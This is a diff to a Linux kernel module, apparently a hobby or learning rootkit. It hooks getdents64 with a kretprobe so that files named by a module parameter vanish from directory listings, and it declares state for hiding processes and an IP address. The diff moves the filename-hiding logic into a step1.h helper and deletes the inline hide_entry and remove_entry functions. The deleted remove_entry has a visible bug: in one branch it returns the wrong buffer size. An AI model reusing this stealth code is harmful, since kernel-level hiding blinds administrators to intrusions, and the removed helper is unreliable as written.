@@ -23,6 +23,7 @@
 #include <linux/if_arp.h>
 
 #include "helpers.h"
+#include "step1.h"
 
 static char* hide_file_name = "FILE";
 module_param(hide_file_name, charp, S_IRWXU);
@@ -45,31 +46,11 @@ static char selected_ip[4] = {0, 0, 0, 0};
 static char* pid_to_hide_path[256] = {0};
 
 
-typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
-
-/// hide directory entries from result buffer
-/// @buffer is the result buffer to store @refitem linux_dirent64
-/// @size of buffer in bytes
-/// @return new buffer size
-static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data);
-
-
-static unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size);
-
 struct getdent64_arguments {
     unsigned int fd;
     void* buffer_ptr;
     unsigned int count;
 };
-
-static bool hide_entry_by_name(struct linux_dirent64* entry, void* data){
-    const char* str = data;
-    if(strcmp(entry->d_name, str) == 0){
-        pr_info("Hidding %s\n", str);
-        return true;
-    }
-    return false;
-}
 
 
 static int getents64_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
@@ -102,7 +83,7 @@ static int getents64_handle_return(struct kretprobe_instance *ri, struct pt_regs
         return 0;
 
     // hide by name
-    unsigned long new_size_after_hide_file = hide_entry(args->buffer_ptr, buffer_count, hide_entry_by_name, (void*)hide_file_name);
+    unsigned long new_size_after_hide_file = step1_hide_file_by_name(args->buffer_ptr, buffer_count, hide_file_name);
     regs_set_return_value(regs, new_size_after_hide_file);
 
     //pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
@@ -481,40 +462,3 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yarin");
 MODULE_DESCRIPTION("Test Module");
 
-unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data){
-    unsigned long offset = 0;
-
-    // find entry to hide
-    while(offset < size){
-        struct linux_dirent64* current_ent = (struct linux_dirent64* )(buffer + offset);
-        if(entryFilter(current_ent, data) == true){
-            return remove_entry(buffer, size, offset, current_ent->d_reclen);
-        }
-        offset += current_ent->d_reclen;
-    }
-
-    return size;
-}
-
-unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size) {
-    // ptr of entry
-    void* dest = buffer + entry_offset;
-    // ptr of next entry
-    void* src = dest + entry_size;
-    // count of entries from entry to hide to end
-    unsigned long count = buffer_size - entry_offset - entry_size;
-
-    if(count == 0){
-        // nothing to copy it is last entry
-        return buffer_size - entry_size;
-    }
-    else {
-        // offset     2
-        // nextOffset 3
-        // [0, 1, 2, 3, 4]
-        // -----[        ] dest
-        // --------[     ] source
-        memcpy(dest, src, count);
-        return count;
-    }
-}
